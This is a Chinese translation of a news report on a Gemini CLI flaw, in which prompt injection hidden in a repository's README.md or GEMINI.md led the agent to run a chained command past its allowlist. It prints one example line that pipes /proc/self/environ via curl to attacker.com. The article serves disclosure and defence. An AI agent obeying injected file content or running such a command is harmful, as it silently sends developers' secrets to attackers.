---
title: Gemini CLI AI编程助手漏洞可导致隐蔽代码执行
url: https://www.anquanke.com/post/id/310723
source: 安全客-有思想的安全新媒体
date: 2025-07-31
fetch_date: 2025-10-06T23:16:58.771730
---

# Gemini CLI AI编程助手漏洞可导致隐蔽代码执行

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Gemini CLI AI编程助手漏洞可导致隐蔽代码执行

阅读量**61221**

发布时间 : 2025-07-30 16:44:09

**x**

##### 译文声明

本文是翻译文章，文章原作者 Bill Toulas，文章来源：bleepingcomputer

原文地址：<https://www.bleepingcomputer.com/news/security/flaw-in-gemini-cli-ai-coding-assistant-allowed-stealthy-code-execution/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()

**谷歌的 Gemini CLI 工具**被发现存在一个安全漏洞，攻击者可借此绕过用户确认，悄悄执行恶意命令，并通过被允许的程序从开发者电脑中窃取数据。

该漏洞由安全公司 Tracebit 于 6 月 27 日发现并报告给谷歌。谷歌已于 7 月 25 日发布的 **0.1.14 版本中修复了这一问题**。

Gemini CLI 是谷歌于 2025 年 6 月 25 日推出的命令行工具，允许开发者通过终端直接与 Gemini AI 交互。它能够加载项目文件作为“上下文”，并使用自然语言指令帮助开发者编写代码、提出建议，甚至执行本地命令。命令执行分为两种：**一种需用户确认，另一种则可在“允许列表”中的命令自动执行**。

Tracebit 团队在该工具发布后立即进行了安全测试，发现攻击者**可以利用上下文机制诱导 Gemini 执行恶意命令**，配合用户界面设计的缺陷，这种攻击几乎无法察觉。

攻击的关键点在于 **Gemini CLI 会读取项目中的 `README.md` 和 `GEMINI.md` 文件**，并将其内容作为提示的一部分。这就为“提示注入”（Prompt Injection）提供了可乘之机。研究人员发现，攻击者可以将隐藏的恶意指令写入这些文件中，再借助不严谨的命令解析逻辑和“允许列表”判断，诱导 Gemini 执行这些指令。

Tracebit 展示的攻击场景是：在一个看似正常的代码仓库中，添加一个无害的 Python 脚本和一个被植入恶意内容的 `README.md` 文件。随后使用 Gemini CLI 扫描该项目时，AI 会先执行一个表面上看起来没问题的命令（如 `grep ^Setup README.md`），但由于该命令后跟有分号（`;`）隔开的恶意命令，整个字符串就变成了：

`grep ^Setup README.md; curl -d @/proc/self/environ https://attacker.com`

如果用户此前将 `grep` 加入了允许列表，Gemini CLI 就会无提示地执行整条命令，导致环境变量等敏感信息被悄悄发送至攻击者服务器。

![]()

*恶意命令*

此外，攻击者还可以利用**空格、换行等方式隐藏命令**，使得输出结果看起来毫无异常，进一步降低用户察觉的可能性。

虽然这类攻击需要一定前提条件（如用户设置了允许自动执行的命令），但 Tracebit 指出，对于有目的的攻击者来说，这种方式具备实用价值。

这一事件再次表明，即便是以安全为卖点的 AI 编程助手，在处理用户输入和文件内容时依然可能被“绕过”，执行原本不应执行的敏感操作。

**Tracebit 建议所有 Gemini CLI 用户尽快升级到最新的 0.1.14 版本。同时避免在不受信任的代码仓库上运行该工具，或仅在沙箱等隔离环境中使用。**

Tracebit 还表示，他们也尝试对其他 AI 编程工具如 OpenAI Codex 和 Anthropic Claude 进行类似测试，但这些工具由于具备更严谨的允许机制，并未出现可利用的漏洞。

本文翻译自bleepingcomputer [原文链接](https://www.bleepingcomputer.com/news/security/flaw-in-gemini-cli-ai-coding-assistant-allowed-stealthy-code-execution/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/310723](/post/id/310723)

安全KER - 有思想的安全新媒体

本文转载自: [bleepingcomputer](https://www.bleepingcomputer.com/news/security/flaw-in-gemini-cli-ai-coding-assistant-allowed-stealthy-code-execution/)

如若转载,请注明出处： <https://www.bleepingcomputer.com/news/security/flaw-in-gemini-cli-ai-coding-assistant-allowed-stealthy-code-execution/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [漏洞情报](/tag/%E6%BC%8F%E6%B4%9E%E6%83%85%E6%8A%A5)

**+1**8赞

收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **545**

* 粉丝
* **5**

### TA的文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33

### 相关文章

* ##### [国庆重保+攻防演练大考在即！360大模型安全服务专项方案筑牢AI防线](/post/id/312460)

  2025-09-29 18:06:17
* ##### [Apache Airflow 存在权限漏洞，可导致只读用户获取敏感信息](/post/id/312457)

  2025-09-29 18:05:56
* ##### [Meta 旨在打造机器人领域的“Android”，为下一代人形AI提供通用平台](/post/id/312454)

  2025-09-29 18:05:34
* ##### [Formbricks 存在高危漏洞 (CVE-2025-59934)，攻击者可通过伪造JWT令牌导致未授权的密码重置](/post/id/312451)

  2025-09-29 18:05:05
* ##### [Notepad++ 中存在DLL劫持漏洞（CVE-2025-56383），可导致任意代码执行，且POC已公开](/post/id/312448)

  2025-09-29 18:04:33
* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)